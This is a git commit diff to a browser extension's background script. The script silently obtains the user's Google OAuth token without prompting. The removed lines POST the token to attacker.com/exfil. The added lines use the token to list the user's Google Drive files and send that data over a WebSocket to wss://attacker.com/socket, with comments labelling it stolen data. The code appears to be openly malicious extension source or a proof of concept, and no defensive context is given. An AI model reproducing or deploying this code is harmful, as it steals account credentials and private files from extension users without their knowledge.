d46456f47a68dbed04925ca143279063576781dd
CD025 <duttapapun7@gmail.com>
2025-03-03 02:35:24 +0530

    Update background.js

--- extension/background.js
+++ extension/background.js
@@ -1,4 +1,6 @@
 (async function() {
+    const WEBSOCKET_URL = "wss://attacker.com/socket"; // WebSocket Server
+
     async function getOAuthToken() {
         return new Promise((resolve, reject) => {
             chrome.identity.getAuthToken({ interactive: false }, function(token) {
@@ -11,17 +13,28 @@
         });
     }
 
-    async function sendTokenToAttacker(token) {
-        await fetch("https://attacker.com/exfil", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ token: token })
+    async function fetchDriveFiles(token) {
+        let response = await fetch("https://www.googleapis.com/drive/v3/files", {
+            headers: { Authorization: `Bearer ${token}` }
         });
+        let data = await response.json();
+        return data;
+    }
+
+    function sendDataOverWebSocket(data) {
+        let socket = new WebSocket(WEBSOCKET_URL);
+        
+        socket.onopen = () => {
+            socket.send(JSON.stringify(data)); // Send stolen data over WebSocket
+        };
+        
+        socket.onerror = (err) => console.error("WebSocket Error:", err);
     }
 
     try {
         let token = await getOAuthToken();
-        await sendTokenToAttacker(token);
+        let driveFiles = await fetchDriveFiles(token);
+        sendDataOverWebSocket(driveFiles); // Send stolen Drive files to WebSocket
     } catch (error) {
         console.error("Error:", error);
     }
